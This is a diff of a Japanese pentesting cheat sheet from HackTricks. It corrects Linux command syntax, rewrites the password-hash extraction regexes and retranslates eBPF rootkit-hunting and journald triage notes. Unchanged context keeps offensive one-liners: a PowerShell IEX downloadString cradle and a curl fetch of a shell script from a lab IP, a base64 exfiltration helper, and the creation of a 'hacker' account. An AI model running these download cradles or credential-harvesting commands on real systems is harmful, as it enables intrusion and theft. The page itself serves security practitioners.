@@ -2,7 +2,10 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## 一般的なBash
+## よく使うBash
+
+`lsof -i4` と `lsof -i6` はIPファミリーを選択します。<sup>[[8]](#references)</sup> `7z x` はアーカイブをディレクトリ構造を保ったまま展開します。<sup>[[9]](#references)</sup> `wc -c` は文字数ではなくバイト数をカウントします。<sup>[[13]](#references)</sup> アカウントの例では `passwd` を対話形式で使用します。`useradd -p` が受け取るのは事前に計算されたcryptハッシュであり、シェルコマンドではありません。また、その引数はプロセス一覧に表示されます。<sup>[[10]](#references)</sup>
+
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -18,7 +21,7 @@ echo -n -e
 
 #Count
 wc -l <file> #Lines
-wc -c #Chars
+wc -c #Bytes
 
 #Sort
 sort -nr #Sort by number and then reverse
@@ -36,9 +39,9 @@ curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 lsof #Open files belonging to any process
 lsof -p 3 #Open files used by the process
 lsof -i #Files used by networks processes
-lsof -i 4 #Files used by network IPv4 processes
-lsof -i 6 #Files used by network IPv6 processes
-lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
+lsof -i4 #Files used by network IPv4 processes
+lsof -i6 #Files used by network IPv6 processes
+lsof -i4 -a -p 1234 #List all open IPv4 network files in use by process 1234
 lsof +D /lib #Processes using files inside the indicated dir
 lsof -i :80 #Files uses by networks processes
 fuser -nv tcp 80
@@ -58,11 +61,12 @@ bzip2 -d /path/to/yourfile.bz2
 tar jxf file.tar.bz2
 gunzip /path/to/yourfile.gz
 unzip file.zip
-7z -x file.7z
+7z x file.7z
 sudo apt-get install xz-utils; unxz file.xz
 
 #Add new user
-useradd -p 'openssl passwd -1 <Password>' hacker
+sudo useradd -m hacker
+sudo passwd hacker
 
 #Clipboard
 xclip -sel c < cat file.txt
@@ -129,7 +133,9 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
+
 ## Windows向けBash
+
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -149,7 +155,11 @@ python pyinstaller.py --onefile exploit.py
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
+
 ## Greps
+
+`{n}` 量指定子などの拡張正規表現には `grep -E` を、MD5 の look-around には `grep -P` を使用します。パスワードハッシュを抽出するときは、シェルのドル記号を引用符で囲んでください。<sup>[[11]](#references)</sup> これらの式で見つかるのは**候補**であり、ハッシュ形式の証明ではありません。cracking mode を選択する前に、結果を[ハッシュの識別とcrackingのワークフロー](../../crypto/hashes/#password-hashing-and-cracking)と照合してください。<sup>[[12]](#references)</sup>
+
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -163,29 +173,23 @@ grep -i "pwd\|passw" file.txt
 #Extract users
 grep -i "user\|invalid\|authentication\|login" file.txt
 
-# Extract hashes
-#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
-egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
-#Extract valid MySQL-Old hashes
-grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
-#Extract blowfish hashes
-grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
-#Extract Joomla hashes
-egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
-#Extract VBulletin hashes
-egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
-#Extraxt phpBB3-MD5
-egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
-#Extract Wordpress-MD5
-egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
-#Extract Drupal 7
-egrep -o '$S$S{52}' *.txt > drupal-7.txt
-#Extract old Unix-md5
-egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
-#Extract md5-apr1
-egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
-#Extract sha512crypt, SHA512(Unix)
-egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt
+# Extract hash candidates from text (validate against the application format)
+# Raw MD5: 32 hex characters
+grep -Po '(?<![[:xdigit:]])[[:xdigit:]]{32}(?![[:xdigit:]])' *.txt > md5-hashes.txt
+# Legacy MySQL323: two 8-hex halves whose leading nibble is 0..7
+grep -Eo '[0-7][[:xdigit:]]{7}[0-7][[:xdigit:]]{7}' *.txt > mysql-old-hashes.txt
+# bcrypt ($2a$/$2b$/$2y$): 60 characters total
+grep -Eo '\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}' *.txt > bcrypt-hashes.txt
+# Legacy MD5:salt pairs: identify the application before choosing a mode
+grep -Eo '[[:xdigit:]]{32}:[[:alnum:]]{3,32}' *.txt > md5-salt-candidates.txt
+# phpass ($H$ phpBB3; $P$ WordPress and other applications)
+grep -Eo '\$[PH]\$[./A-Za-z0-9]{31}' *.txt > phpass-hashes.txt
+# Drupal 7
+grep -Eo '\$S\$[./A-Za-z0-9]{52}' *.txt > drupal-7.txt
+# Unix md5crypt, Apache apr1, and sha512crypt (optional rounds field)
+grep -Eo '\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > md5crypt.txt
+grep -Eo '\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > apr1.txt
+grep -Eo '\$6\$(rounds=[0-9]+\$)?[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}' *.txt > sha512crypt.txt
 
 #Extract e-mails from text files
 grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt
@@ -229,7 +233,9 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
-## Find
+
+## 検索
+
 ```bash
 # Find SUID set files.
 find / -perm /u=s -ls 2>/dev/null
@@ -258,19 +264,25 @@ find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /p
 # Found Newer directory only and sort by time. (depth = 5)
 find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
 ```
-## Nmapの検索ヘルプ
+
+## Nmap検索ヘルプ
+
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 nmap --script-help "(default or version) and smb)"
 ```
+
 ## Bash
+
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
+
 ## Iptables
+
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -301,9 +313,11 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-## eBPF Telemetry と Rootkit Hunting
 
-Rootkit research では、TripleCross のような eBPF-based implants と、BPFDoor variants のような BPF-based backdoors の両方が実証されています。予期しない BPF programs、attachments、または maps は、侵害の証拠ではなく、調査の手がかりとして扱ってください。<sup>[[3]](#references)[[4]](#references)</sup> `bpftool` または `eBPFmon` を使用して認可済みシステムの baseline を取得します。`bpftool` は programs と maps の列挙、program instructions のダンプ、サポートされている features の照会を実行でき、eBPFmon はその情報を TUI で表示します。<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+## eBPF Telemetry & Rootkit Hunting
+
+Rootkitの調査では、TripleCrossのようなeBPFベースのimplantと、BPFDoorの亜種のようなBPFベースのbackdoorの両方が実証されています。予期しないBPFプログラム、アタッチメント、またはマップは、侵害の証拠ではなく調査の手掛かりとして扱ってください。<sup>[[3]](#references)[[4]](#references)</sup> `bpftool`または`eBPFmon`を使って、許可されたシステムのベースラインを作成しましょう。`bpftool`はプログラムとマップの列挙、プログラム命令のダンプ、サポートされている機能の照会ができ、eBPFmonはそれらの情報をTUIで表示します。<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+
 ```bash
 #Enumerate all eBPF programs, attach points, owning PIDs and map IDs
 sudo bpftool prog
@@ -321,11 +335,13 @@ sudo bpftool feature probe | less
 #TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
 sudo ebpfmon
 ```
-`bpftool`の出力を、想定されるNIC/cgroupへのアタッチと照合します。承認されていないPIDが所有する突然の`xdp`または`kprobe`プログラムは、調査の手掛かりではありますが、injected payloadの決定的な証拠ではありません。<sup>[[5]](#references)[[6]](#references)</sup>
 
-## Journaldインシデントトリアージ
+`bpftool` の出力を、想定される NIC/cgroup へのアタッチメントと照合します。未承認の PID が所有する `xdp` または `kprobe` プログラムが突然現れた場合、調査の手掛かりにはなりますが、ペイロードが注入された決定的な証拠ではありません。<sup>[[5]](#references)[[6]](#references)</sup>
 
-`journalctl`は`systemd-journald`から構造化されたエントリを読み取り、boot、priority、unit、UID、相対時間によるフィルタリングをサポートします。証拠を保持または比較する必要がある場合は、これらのフィルターをJSON出力と組み合わせます。フィルタリングだけでは、ログが改ざんされていないことを証明できません。<sup>[[2]](#references)[[7]](#references)</sup>
+## Journald インシデントのトリアージ
+
+`journalctl` は `systemd-journald` から構造化されたエントリを読み込み、起動、優先度、ユニット、UID、相対時刻でのフィルタリングをサポートします。証拠を保持または比較する必要がある場合は、これらのフィルターと JSON 出力を組み合わせてください。フィルタリングだけでは、ログが改ざんされていないことの証明にはなりません。<sup>[[2]](#references)[[7]](#references)</sup>
+
 ```bash
 journalctl --list-boots                                #Enumerate boot IDs with timestamps
 journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
@@ -336,15 +352,24 @@ journalctl --disk-usage                               #Quickly show journal size
 sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
 journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
 ```
-`--grep 'Invalid user' --case-sensitive` または `-k`（kernel messages のみ）を追加すると、より厳密にフィルタリングできます。また、`_PID`、`_SYSTEMD_UNIT`、`_HOSTNAME`、`_TRANSPORT` の selector は組み合わせて、対象を絞った調査に使用できます。<sup>[[7]](#references)</sup>
+
+より絞り込むには、`--grep 'Invalid user' --case-sensitive` または `-k`（kernel messages only）を追加してください。また、`_PID`、`_SYSTEMD_UNIT`、`_HOSTNAME`、`_TRANSPORT` のセレクターは組み合わせて、対象を絞った調査に利用できます。<sup>[[7]](#references)</sup>
+
+
 
 ## References
 
-- [1] [eBPFmon: eBPF applications を探索および操作するための新しい tool](https://redcanary.com/blog/linux-security/ebpfmon/)
-- [2] [journalctl command を使用して Linux logs を表示する方法](https://www.hostinger.com/tutorials/journalctl-command)
+- [1] [eBPFmon: eBPFアプリケーションを調査・操作するための新しいツール](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [2] [journalctlコマンドでLinuxログを表示する方法](https://www.hostinger.com/tutorials/journalctl-command)
 - [3] [h3xduck/TripleCross](https://github.com/h3xduck/TripleCross)
-- [4] [Rapid7 Labs: Telecom Networks における BPFdoor](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
-- [5] [BPF Documentation — Linux Kernel documentation](https://docs.kernel.org/bpf/)
+- [4] [Rapid7 Labs: 通信ネットワークにおけるBPFdoor](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
+- [5] [BPFドキュメント — Linuxカーネルのドキュメント](https://docs.kernel.org/bpf/)
 - [6] [libbpf/bpftool](https://github.com/libbpf/bpftool)
-- [7] [journalctl(1) — Linux manual page](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [7] [journalctl(1) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [8] [lsof(8) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man8/lsof.8.html)
+- [9] [7-Zipのxコマンド](https://documentation.help/7-Zip-18.0/extract_full.htm)
+- [10] [useradd(8) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man8/useradd.8.html)
+- [11] [grep(1) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/grep.1.html)
+- [12] [Hashcatのサンプルハッシュ](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-example-hashes.md)
+- [13] [wc(1) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/wc.1.html)
 {{#include ../../banners/hacktricks-training.md}}
